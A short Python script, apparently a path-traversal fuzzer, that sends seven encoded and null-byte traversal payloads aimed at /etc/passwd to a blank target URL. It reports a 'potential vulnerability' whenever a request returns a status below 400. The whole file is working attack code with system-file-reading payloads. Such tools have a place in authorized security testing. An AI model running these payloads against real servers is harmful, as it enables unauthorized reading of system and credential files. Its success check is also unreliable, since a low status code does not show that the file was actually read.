import requests
import sys

TARGET = ''

def fuzz_input(target):
    payloads = [
        '../../../etc/passwd',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
        '/var/www/images/../../../etc/passwd',
        '../../../etc/passwd%00.jpg'
    ]

    for payload in payloads:
        try:
            response = requests.get(target+payload)
        except requests.RequestException as e:
            print(f'An error occurred: {e}')
            sys.exit()

        print(response.request.url)

        if response.status_code < 400:
            print('Potential Path Traversal vulnerability detected!')
            print(f'Status code: {response.status_code}')
            print(f'Payload used: {payload} \n')
        else:
            print(f'Path Traversal failed using {payload} \n')

if __name__ == '__main__':
    fuzz_input(TARGET)